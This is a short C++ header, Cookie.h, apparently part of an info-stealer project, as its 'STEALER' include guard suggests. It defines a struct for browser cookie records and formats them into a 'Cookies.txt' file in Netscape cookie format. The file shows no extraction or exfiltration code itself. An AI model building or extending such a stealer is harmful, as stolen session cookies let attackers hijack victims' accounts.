//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_COOKIE_H
#define STEALER_COOKIE_H

#include "../Includes.h"
#include "Entity.h"

struct Cookie : public Entity {
    std::string host_key;
    std::string name;
    std::string value;
    std::string path;
    long long expires_utc;

    bool canBeWrite() override {
        return !(host_key.empty() && name.empty() && value.empty() && path.empty() && 0 == expires_utc);
    }

    std::string toString() override {
        return this->host_key +
               "\tTRUE\t" +
               this->path +
               "\tFALSE\t" +
               std::to_string(this->expires_utc) +
               "\t" +
               this->name +
               "\t" +
               this->value +
               "\r";
    }

    std::string getFileName() override {
        return "Cookies.txt";
    }
};

#endif //STEALER_COOKIE_H
